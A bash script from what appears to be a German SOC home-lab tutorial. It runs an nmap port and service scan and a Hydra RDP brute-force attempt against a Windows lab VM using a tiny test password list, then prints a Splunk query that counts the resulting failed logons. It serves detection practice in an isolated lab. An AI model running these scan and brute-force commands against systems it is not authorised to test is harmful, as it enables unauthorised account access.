#!/usr/bin/env bash
#
# attack-simulation.sh
#
# Einfache Angriffssimulation aus Teil 2 des SOC Home Lab: Portscan gegen
# die Windows-Ziel-VM, gefolgt von einem RDP-Brute-Force-Test mit Hydra.
# Läuft auf der Kali-VM. Nur für den eigenen, isolierten Lab-Aufbau gedacht.
#
# Verwendung:
#   chmod +x attack-simulation.sh
#   ./attack-simulation.sh 192.168.0.105 WhiteLotus

set -euo pipefail

TARGET="${1:?Usage: $0 <target-ip> <rdp-username>}"
USERNAME="${2:?Usage: $0 <target-ip> <rdp-username>}"
WORDLIST="/tmp/passwords.txt"

echo "[*] Ziel: ${TARGET}"

echo "[*] Schritt 1: Portscan (Windows blockt ICMP, daher -Pn)"
sudo nmap -Pn -sV "${TARGET}"

echo "[*] Schritt 2: Gezielter Scan auf RDP (3389)"
sudo nmap -Pn -sV -p 3389 "${TARGET}"

echo "[*] Schritt 3: Testpasswortliste anlegen (bewusst ohne echtes Passwort)"
cat > "${WORDLIST}" <<EOF
123456
password
admin
letmein
qwerty
Willkommen1
EOF

echo "[*] Schritt 4: Brute-Force-Test gegen RDP mit Hydra"
hydra -l "${USERNAME}" -P "${WORDLIST}" "rdp://${TARGET}"

echo "[*] Fertig. Nachweis jetzt in Splunk prüfen:"
echo '    index=security_logs EventCode=4625'
echo '    | stats count by Source_Network_Address, Account_Name'
echo '    | where count > 3'